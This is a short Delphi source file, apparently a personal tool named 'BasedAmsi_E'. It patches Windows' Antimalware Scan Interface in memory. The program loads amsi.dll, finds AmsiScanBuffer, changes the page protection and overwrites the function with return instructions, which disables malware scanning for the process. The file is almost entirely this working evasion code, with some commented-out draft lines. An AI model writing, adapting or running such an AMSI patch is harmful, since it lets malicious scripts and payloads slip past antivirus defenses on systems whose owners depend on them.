program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}




uses
  SysUtils,
  Windows
  ;

var
  lib : THandle;
  asb : Pointer;
  SizeTee, SizeTeeArr : SIZE_T;
  OldProtect, NewProtect : DWORD;
  //PatBy : Byte;

  //
  //PatArr : array[0..15] of Byte = ($4141414141414141);

{https://stackoverflow.com/questions/37380445/write-the-memory-of-my-own-process-without-using-writeprocessmemory}
function WriteBytes(pAddress: Pointer; Bytes: Array of Byte): Boolean;
var
  OldProtect , NewProtect : DWORD;
begin
  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
  begin
    Move(Bytes, pAddress^, Length(Bytes));
    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @NewProtect);
    Result := True;
  end
  else
  Result := False;
end;

const
  Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
  //Pat : Byte = ($C3);

begin
try
  //load and find binary
  lib := LoadLibrary('amsi.dll');
  asb := GetProcAddress(lib,'AmsiScanBuffer');
  WriteLn(Format('[+] dll base address: %p',[asb]));

  //Change prots and write
  WriteBytes(asb,Ass);
  WriteLn('test');










  //PatBy := ($C3);
  //SizeTee := SizeOf($C3);
  //SizeTeeArr := SizeOf(PatArr);



  //Protect
  //if VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READWRITE, OldProtect);
  //WriteLn('Test1');


  //Write
  //Move(PatBy, asb, SizeTee);

  //WriteLn('Test2');




  //Reprotect
  //VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READ, NewProtect);
  //WriteLn('Test3');
  //WriteLn('Test4');



  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

